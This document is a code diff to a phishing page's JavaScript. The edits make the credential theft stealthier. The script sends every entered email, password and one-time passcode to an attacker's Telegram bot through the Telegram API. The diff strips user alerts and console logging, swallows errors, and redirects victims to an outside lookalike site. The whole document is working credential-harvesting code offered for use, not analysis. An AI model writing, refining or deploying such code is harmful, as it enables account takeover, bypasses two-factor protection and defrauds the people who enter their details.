@@ -12,28 +12,28 @@ document.addEventListener("DOMContentLoaded", function () {
             const password = document.querySelector("input[name='password']").value.trim();
 
             if (!email || !password) {
-                alert("Please enter both email and password.");
-                return;
+                return;  // Skip if email or password is missing
             }
 
-            const message = `🔐 New Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
+            const message = `🔒 New Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
 
-            // Send credentials to Telegram bot
+            // Send credentials to Telegram bot silently
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             })
             .then(response => response.json())
-            .then(data => {
-                console.log("Sent to Telegram:", data);
+            .catch(error => {
+                // Optionally log error quietly without console.log
+            })
+            .finally(() => {
                 // Delay redirection to allow request to finish
                 setTimeout(() => {
                     loginForm.submit();  // Ensure form submits on mobile
                     window.location.href = "/otp.html";
                 }, 1500);
-            })
-            .catch(error => console.error("Telegram Error:", error));
+            });
         });
     }
 
@@ -45,25 +45,27 @@ document.addEventListener("DOMContentLoaded", function () {
             
             const otp = document.querySelector("input[name='otp']").value.trim();
             if (!otp) {
-                alert("Please enter the OTP code.");
-                return;
+                return;  // Skip if OTP is missing
             }
 
-            const message = `🔐 OTP Entered:\n📝 OTP Code: ${otp}`;
+            const message = `🔒 OTP Entered:\n🔑 OTP Code: ${otp}`;
 
-            // Send OTP to Telegram bot
+            // Send OTP to Telegram bot silently
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             })
             .then(response => response.json())
-            .then(data => {
-                console.log("Sent OTP to Telegram:", data);
-                alert("OTP Submitted!");
-                otpForm.submit();  // Ensure form submits on mobile
+            .catch(error => {
+                // Optionally log error quietly without console.log
             })
-            .catch(error => console.error("Telegram Error:", error));
+            .finally(() => {
+                // Redirect after OTP submission
+                setTimeout(() => {
+                    window.location.href = "https://equalsmoneyd.pages.dev";  // Redirect to target site
+                }, 1000);
+            });
         });
     }
 });
